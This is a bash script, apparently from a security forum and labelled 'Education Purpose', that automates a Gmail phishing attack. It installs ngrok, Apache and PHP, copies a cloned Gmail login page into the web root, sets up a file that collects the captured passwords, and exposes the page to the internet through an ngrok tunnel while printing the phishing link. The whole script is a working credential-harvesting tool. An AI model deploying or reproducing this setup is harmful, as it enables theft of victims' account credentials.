#!/bin/bash

##########################check os bit#############
MACHINE_TYPE=`uname -m`
if [ ${MACHINE_TYPE} == 'x86_64' ]; then
  machine='64'
else
  machine='32'
fi
######################end check os bit#############

banner(){
clear
printf "\e[1;91m
=============================================\e[1;92m
    ╦  ┌─┐┌─┐┬ ┬  ╔═╗┬ ┬┬┌─┐┬ ┬┌─┐┬─┐┌─┐
    ║  ├─┤┌─┘└┬┘  ╠═╝├─┤│└─┐├─┤├┤ ├┬┘└─┐
    ╩═╝┴ ┴└─┘ ┴   ╩  ┴ ┴┴└─┘┴ ┴└─┘┴└─└─┘\e[1;91m
=============================================\e[1;93m
Education Purpose from \e[1;92mMyanmar Security Forum\e[1;91m
=============================================\e[1;93m
    MSF_J3rry / gmail phishing script + ngrok\e[1;91m
=============================================
\n\e[0m"

}

########################## ngrok install#############
askyn(){
	while true; do
    read -p $'\e[1;90m Install this program (y|n)? : (default Y) : \e[0m' yn
	yn="${yn:-y}"
    case $yn in
        [Yy]* ) ans="yes";break;;
        [Nn]* ) printf "\e[1;92m Good Bye\n\e[0m";exit;;
        * ) echo " Please answer yes or no.";;
    esac
	done
}
check_auth(){
	read -p $'\e[1;92m Enter authtoken :: \e[0m' authcode
    auth=${#authcode}
    if [[ $auth > 35 || $auth < 48 ]]; then
    	ngrok authtoken $authcode
    else
    	check_auth
    fi
}
install_ngrok(){
	if [ $machine=='32' ]; then
		printf "\e[1;92m ngrok 32 bit installing... \n\e[0m"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
		unzip ngrok-stable-linux-386.zip
	else
		printf "\e[1;92m ngrok 64 bit installing... \n\e[0m"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
		unzip ngrok-stable-linux-amd64.zip
	fi
	mv ngrok /usr/bin/ngrok
	printf "\e[1;91m You need to singup at https://dashboard.ngrok.com/signup \n save auth token at https://dashboard.ngrok.com/get-started \n step 3 : $ ./ngrok authtoken [[[this is auth code]]]\n\e[0m"
	check_auth
}
########################## ngrok install#############

########################## ngrok check#############
check_ngrok(){
printf "\e[1;93mChecking Ngrok... \n\e[0m"
if [ -f "/usr/bin/ngrok" ]; then
    printf "\e[1;92m Ngrok Exist \n\e[0m"
else
	printf "\e[1;91m Ngrok not Exist \n\e[0m"
	askyn
	install_ngrok
fi
}
########################## ngrok check#############
check_web(){
	apache=$(which apache2)
	printf "\e[1;93mChecking Apache2... \n\e[0m"
	if [[ $apache = *apache2* ]]; then
    	printf "\e[1;92m apache2 Exist \n\e[0m"
    else
    	printf "\e[1;91m apache2 not Exist \n\e[0m"
    	printf "\e[1;93m apache2 installing... \n\e[0m"
    	apt-get -y install apache2
    	printf "\e[1;93m apache2 installed... \n\e[0m"
    fi
    php=$(which php)
	printf "\e[1;93mChecking php... \n\e[0m"
	if [[ $php = *php* ]]; then
    	printf "\e[1;92m Php Exist \n\e[0m"
    else
    	printf "\e[1;91m php not Exist \n\e[0m"
    	printf "\e[1;93m php installing... \n\e[0m"
    	apt-get -y install php7.3
    	printf "\e[1;93m php installed... \n\e[0m"
    fi
}
#################gmail phishing code #############
phish(){
	unzip gmail.zip
	cp -r gmail /var/www/html
	printf "\e[1;93m You can Look pass file on new terminal \e[1;91m\"cat /var/www/html/gmail/msf-lazy.txt\" ... \n\e[0m"
	chmod 755 /var/www/html/gmail
	chmod 722 /var/www/html/gmail/msf-lazy.txt
}
#################gmail phishing code #############
start_service(){
	printf "\e[1;93m Start apache2 service... \n\e[0m"
	service apache2 start
	printf "\e[1;93m Start ngrok service... \n\e[0m"
	printf "\e[1;92m Phishing link is : http://ngrok_domain/gmail \n\e[0m"
	ngrok http 80
}

banner
check_ngrok
check_web
phish
start_service
